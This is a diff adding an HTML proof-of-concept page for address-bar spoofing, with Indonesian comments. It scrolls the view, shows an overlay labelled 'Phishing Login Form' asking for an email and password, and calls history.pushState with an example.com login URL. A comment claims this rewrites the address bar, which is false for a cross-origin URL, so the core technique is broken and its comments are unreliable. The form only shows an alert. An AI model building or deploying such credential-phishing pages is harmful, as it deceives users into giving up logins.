@@ -1,0 +1,167 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Highly Complex PoC: Address Bar Spoofing</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #f0f0f0;
+        }
+        #instructions {
+            font-size: 2em;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+        #targetPage {
+            width: 100%;
+            height: 200vh; /* Halaman lebih tinggi untuk scrolling */
+            background: linear-gradient(to bottom, #007bff, #28a745);
+            position: relative;
+            opacity: 0.9;
+            transition: opacity 1s;
+        }
+        #spoofContent {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+        }
+        #spoofForm {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        input[type="text"], input[type="password"] {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            width: 200px;
+        }
+        button {
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #dynamicContent {
+            position: absolute;
+            top: 20%;
+            left: 10%;
+            right: 10%;
+            height: 50%;
+            overflow: auto;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 10px;
+            padding: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+<body>
+    <div id="instructions">Click to begin the experiment!</div>
+    <div id="targetPage">
+        <div id="dynamicContent"></div>
+    </div>
+    <div id="spoofContent">
+        <h2>Phishing Login Form</h2>
+        <p>Please log in:</p>
+        <form id="spoofForm">
+            <input type="text" placeholder="Email" required>
+            <input type="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+        <a href="#" id="forgotPassword">Forgot password?</a>
+    </div>
+
+    <script>
+        const instructions = document.getElementById('instructions');
+        const targetPage = document.getElementById('targetPage');
+        const spoofContent = document.getElementById('spoofContent');
+        const dynamicContent = document.getElementById('dynamicContent');
+        let isSpoofing = false;
+        const spoofUrl = 'https://www.example.com/login'; // URL yang akan ditampilkan
+
+        instructions.addEventListener('click', () => {
+            if (!isSpoofing) {
+                isSpoofing = true;
+                instructions.style.display = 'none';
+                loadDynamicContent();
+            }
+        });
+
+        function loadDynamicContent() {
+            // Memuat konten dinamis untuk meningkatkan kompleksitas
+            const content = `
+                <h3>Dynamic Content Loaded</h3>
+                <p>Scroll down for a surprise!</p>
+            `;
+            dynamicContent.innerHTML = content;
+            dynamicContent.style.opacity = '1';
+            simulateScroll();
+        }
+
+        function simulateScroll() {
+            // Simulasi scroll yang membuat address bar tersembunyi
+            targetPage.scrollTo(0, 100);
+            setTimeout(() => {
+                targetPage.scrollTo(0, 400); // Scroll lebih jauh
+                openSpoof();
+            }, 2000); // Menunggu 2 detik sebelum membuka spoof
+        }
+
+        function openSpoof() {
+            // Menampilkan konten spoofing setelah scroll
+            spoofContent.style.display = 'block';
+            spoofContent.scrollIntoView({ behavior: 'smooth' });
+            document.title = 'Spoofed Page'; // Mengubah judul halaman
+            window.history.pushState({}, 'Spoofed', spoofUrl); // Mengubah URL di address bar
+
+            // Menyembunyikan konten dinamis
+            dynamicContent.style.display = 'none';
+            targetPage.style.opacity = '0.5'; // Mengurangi opacity untuk efek
+        }
+
+        // Menangani pengiriman form untuk tujuan demonstrasi
+        document.getElementById('spoofForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            alert('Spoofed login form submitted!');
+            window.history.replaceState({}, 'Original Page', '/original'); // Mengganti kembali ke halaman asli
+        });
+
+        // Menangani tautan 'forgot password'
+        document.getElementById('forgotPassword').addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('Navigating to forgot password page...');
+            window.location.href = 'https://www.example.com/forgot-password'; // Simulasi navigasi
+        });
+
+        // Memantau perubahan state untuk menjaga keamanan
+        window.onpopstate = function(event) {
+            if (event.state) {
+                alert('Navigated back to the original state');
+                location.reload(); // Memuat ulang halaman saat kembali
+            }
+        };
+    </script>
+</body>
+</html>
